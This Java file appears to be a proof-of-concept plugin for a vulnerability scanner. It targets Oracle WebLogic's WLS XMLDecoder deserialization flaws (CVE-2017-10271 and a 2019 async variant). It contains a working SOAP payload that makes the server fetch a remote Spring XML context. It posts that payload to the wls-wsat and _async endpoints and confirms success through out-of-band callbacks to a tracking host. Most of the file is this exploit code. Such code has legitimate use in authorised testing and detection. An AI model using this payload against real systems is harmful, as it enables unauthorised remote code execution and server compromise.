package com.trackray.module.poc;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.bean.Result;
import com.trackray.base.bean.Task;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.entity.PortEntity;
import com.trackray.base.plugin.AbstractPOC;
import com.trackray.base.utils.StrUtils;
import com.trackray.module.inner.FuckCeye;
import org.apache.commons.lang3.StringUtils;
import org.javaweb.core.net.HttpResponse;
import org.springframework.beans.factory.annotation.Autowired;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.Set;
import java.util.UUID;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/10 15:11
 */
@Plugin(title = "WebLogic WLS 反序列化代码执行" ,author = "浅蓝")
public class WebLogicWLSRCE extends AbstractPOC {

    public static String[] pages = {"/wls-wsat/CoordinatorPortType","/_async/AsyncResponseService"};

    @Autowired
    private FuckCeye fuckCeye;

    public static String ssrfPayload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>%s</string></void></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>";

    @Override
    public void attack(Task task) {
        String uuid = UUID.randomUUID().toString().substring(0,8);

        String host = "http://" + uuid + "." + fuckCeye.identifier;

        String payload = String.format(ssrfPayload, host);

        if (!FuckCeye.canUse)
            return;
        try {
            HttpResponse post = requests.url(getTarget().concat(pages[0])).contentType("text/xml").data(payload).post();

            if (post.getStatusCode()!=404){
                Thread.sleep(2000);
                int size = fuckCeye.searchCount(uuid);
                if (size > 0){

                    addVulnerable(
                            Vulnerable.builder()
                                    .title("Weblogic WLS XMLDecoder 反序列化代码执行")
                                    .type(Vulnerable.Type.DESERIALIZE.getType())
                                    .level(Vulnerable.Level.HIGH.getLevel())
                                    .payload(payload)
                                    .address(pages[0])
                                    .vulnId(Arrays.asList("CVE-2017-10271"))
                                    .build()
                    );

                }
            }
            uuid = UUID.randomUUID().toString().substring(0,8);
            host = "http://" + uuid + "." + fuckCeye.identifier;
            payload = String.format(ssrfPayload, host);

            post = requests.url(getTarget().concat(pages[1])).contentType("text/xml").data(payload).post();
            if (post.getStatusCode()!=404 ){
                Thread.sleep(2000);
                int size = fuckCeye.searchCount(uuid);
                if (size > 0){

                    addVulnerable(
                            Vulnerable.builder()
                                    .title("Weblogic wls9_async_response XMLDecoder 反序列化代码执行")
                                    .type(Vulnerable.Type.DESERIALIZE.getType())
                                    .level(Vulnerable.Level.HIGH.getLevel())
                                    .payload(payload)
                                    .address(pages[1])
                                    .vulnId(Arrays.asList("CNVD-C-2019-48814"))
                                    .build()
                    );

                }
            }

        } catch (Exception e) {
            task.getExceptions().add(e);
        }

    }

    @Override
    public boolean check(Result result) {
        boolean flag = false;
        Set<PortEntity> ports = result.getSystemInfo().getPorts();
        for (PortEntity port : ports) {
            String str = port.toString();
            if (str.toLowerCase().contains("weblogic") || (port.getPort() >= 7000 && port.getPort() <= 7005)){
                String host = "http://"+result.getHostInfo().getHost().concat(":") + port.getPort();
                for (String page : pages) {
                    String url = host.concat(page);
                    try {
                        HttpResponse resp = requests.url(url).get();
                        String body = resp.body();
                        if (StringUtils.containsAny(body,"WSDL page","Web Services")) {
                            flag = true;
                            break;
                        }
                    } catch (MalformedURLException e) {
                        continue;
                    }
                }

            }
        }

        if (!flag){
            for (String page : pages) {
                try {
                    URL url = new URL(getTarget());
                    String pageurl = StrUtils.urltoSchemaHostPort(url).concat(page);
                    HttpResponse resp = requests.url(pageurl).get();
                    String body = resp.body();
                    if (StringUtils.containsAny(body,"WSDL page","Web Services")) {
                        flag = true;
                        break;
                    }
                } catch (MalformedURLException e) {
                    continue;
                }
            }
        }

        return flag;
    }
}
